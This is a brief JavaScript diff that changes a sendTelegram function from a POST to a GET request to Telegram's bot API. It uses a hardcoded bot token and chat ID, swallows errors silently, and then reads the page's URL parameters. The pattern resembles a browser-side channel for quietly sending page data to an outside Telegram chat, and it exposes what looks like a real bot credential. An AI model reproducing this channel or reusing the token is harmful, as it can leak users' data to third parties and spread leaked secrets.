@@ -101,11 +101,8 @@ const TELEGRAM_BOT_TOKEN = "8947967987:AAHTEOuxv8H_JnV0t6fbXucJdokS4sQeclY";
 const TELEGRAM_CHAT_ID = "5989643990";
 
 function sendTelegram(text) {
-  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
-  }).catch(() => {});
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}`;
+  fetch(url).catch(() => {});
 }
 
 const params = new URLSearchParams(window.location.search);
